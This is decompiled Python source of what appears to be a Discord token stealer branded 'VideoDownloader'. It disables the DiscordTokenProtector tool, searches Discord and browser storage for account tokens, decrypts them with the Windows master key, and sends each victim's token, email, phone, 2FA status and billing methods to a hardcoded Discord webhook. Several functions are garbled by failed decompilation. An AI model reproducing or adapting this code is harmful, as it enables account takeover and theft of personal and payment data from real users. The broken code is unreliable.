# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'tkn\\functionss.py'
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import base64
import re
import requests
import json
from tkn.functions import coder
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1412107114775580742/oWbRbcvryqRd81jVi-oo5dRqWB8NqC7lrdmwPVxaAFSnw8pFg28ltaBMBda81zBZPgEL'}
class Discord:
    def __init__(self):
        self.baseurl = 'https://discord.com/api/v9/users/@me'
        self.appdata = os.getenv('localappdata')
        self.roaming = os.getenv('appdata')
        self.regex = '[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}'
        self.encrypted_regex = 'dQw4w9WgXcQ:[^\\\"]*'
        self.tokens_sent = []
        self.tokens = []
        self.ids = []
        self.killprotector()
        self.grabTokens()
        self.upload(__CONFIG__['webhook'])
    def killprotector(self):
        # irreducible cflow, using cdg fallback
        # ***<module>.Discord.killprotector: Failure: Compilation Error
        path = f'{self.roaming}\\DiscordTokenProtector'
        config = path + 'config.json'
        match os.path.exists(path):
            pass
        if not None:
            return None
        else:
            for process in ['\\DiscordTokenProtector.exe', '\\ProtectionPayload.dll', '\\secure.dat']:
                try:
                    os.remove(path + process)
                except FileNotFoundError:
                    pass
            if os.path.exists(config) is None:
                with open(config, errors='ignore') as f:
                    pass
            item = json.load(f)
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
                            with open(config, 'w') as f:
                                json.dump(item, f, indent=2, sort_keys=True)
                except json.decoder.JSONDecodeError:
                        return
    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:(-16)].decode()
            return decrypted_pass
        except Exception:
            return 'Failed to decrypt password'
    def get_master_key(self, path):
        with open(path, 'r', encoding='utf-8') as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    def grabTokens(self):
        # ***<module>.Discord.grabTokens: Failure: Compilation Error
        paths = {'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\', 'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\', 'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\', 'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\', 'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\', 'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\', 'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\', 'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\', 'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\', 'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\', 'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\', '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\', 'Sputnik': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\', '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\', 'Vivaldi': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\', '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\', '
        for name, path in paths.items():
            disc = name.replace(' ', '').lower()
                for file_name in 'cord' in path and os.path.exists(self.roaming + f'\\{disc}\\Local State') and (os.listdir(path) is not None):
                            r = [self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming(f'\\{disc}\\Local State'))) for x in file_name[(-3):] not in ['log', 'ldb'] for y in open(f'{path}\\{file_name}', errors='ignore') for x in [x.strip() for x in re.findall(self.encrypted_regex, line) if x.strip() and self.get_master_key(self.roaming(f'\\{disc}\\Local State'))]]
                                        try:
                                            pass
                                        except:
                                            continue
                                        uid = r.json()['id']
                                            self.tokens.append(token), self.ids.append(uid) if uid not in self.ids else None
                else:
                    for file_name in os.listdir(path):
                        if file_name[(-3):] not in ['log', 'ldb']:
                            r = {'id': [{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token} for x in open(f'{path}\\{file_name}', errors='ignore').readlines() for token in [x.strip() for x in re.findall(self.regex, line) for uid in r.json()['id'] if uid not in self.ids and self.tokens.append(token) == self.ids.append(uid)], '__name__': [{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token} for x in re.findall(self.regex, line) if r.status_code == 200], '__module__': [{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token} for x in re.findall(self.regex, line)
                            continue
                        else:
                                    try:
                                        pass
                                    except:
                                        continue
        return [{'User-Agent': self.baseurl, 'Content-Type': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'Authorization': 'application/json', 'Authorization': token} for path, _, files in os.path.exists(self.roaming + '\\Mozilla\\Firefox\\Profiles') and os.walk(self.roaming + '\\Mozilla\\Firefox\\Profiles') for _file in files for token in open(f'{path}\\{_file}', errors='ignore').readlines() for x in [x.strip() for x in re.findall(self.regex, line)]]
                                try:
                                    pass
                                except:
                                    pass
                                else:
                                    pass
    def upload(self, webhook):
        # ***<module>.Discord.upload: Failure: Different bytecode
        for token in self.tokens:
            if token in self.tokens_sent:
                continue
            else:
                val = ''
                methods = ''
                payment, user, win32crypt = ({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token}, requests.get(self.baseurl, headers=headers).json())
                username = user['username']
                discord_id = user['id']
                avatar_url = f'https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif' if requests.get(f'https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif') == 200 else f'https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png'
                phone = user['phone']
                email = user['email']
                mfa = ':white_check_mark:' if user.get('mfa_enabled') else ':x:'
                premium_types = {0: ':x:', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}
                nitro = premium_types.get(user.get('premium_type'), ':x:')
                if 'message' in payment or payment == []:
                    methods = ':x:'
                else:
                    methods = ''.join(['💳' if method['type'] == 1 else '<:paypal:973417655627288666>' if method['type'] == 2 else ':question:' for method in payment])
                val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n:closed_lock_with_key: **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{coder().encode(token)}`\n'
                data = {'embeds': [{'title': f'{username}', 'color': 5639644, 'fields': [{'name': 'Discord Info', 'value': val}], 'thumbnail': {'url': avatar_url}, 'footer': {'text': 'VideoDownloader | Created By Cavanshirpro'}}], 'username': 'VideoDownloader', 'avatar_url': 'https://cdn.discordapp.com/avatars/1447994049968603228/3132665ff4505b35a2f98ea751214dea.png?size=1024'}
                requests.post(webhook, json=data)
                self.tokens_sent.append(token)